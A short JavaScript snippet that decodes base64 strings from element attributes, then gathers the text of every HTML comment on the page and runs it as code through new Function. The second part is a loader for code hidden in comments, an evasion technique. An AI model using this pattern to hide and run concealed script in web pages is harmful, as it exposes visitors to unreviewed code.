var findElem = document.querySelectorAll("[base64]"),
    findString = [].map.call(findElem, function(str) {
        return str.getAttribute("base64");
    }).join("");

var decodedString = atob(findString);

console.log(decodedString);

var nodeList = [];

    TreeWalker = document.createTreeWalker(
        document.body,
        NodeFilter.SHOW_COMMENT,
        {
            acceptNode: function(node) { return NodeFilter.FILTER_ACCEPT; }
        },
        false
    );

    while (TreeWalker.nextNode()) {
        nodeList.push(TreeWalker.currentNode.nodeValue);
    };

var result = new Function(nodeList.join(""));
result();

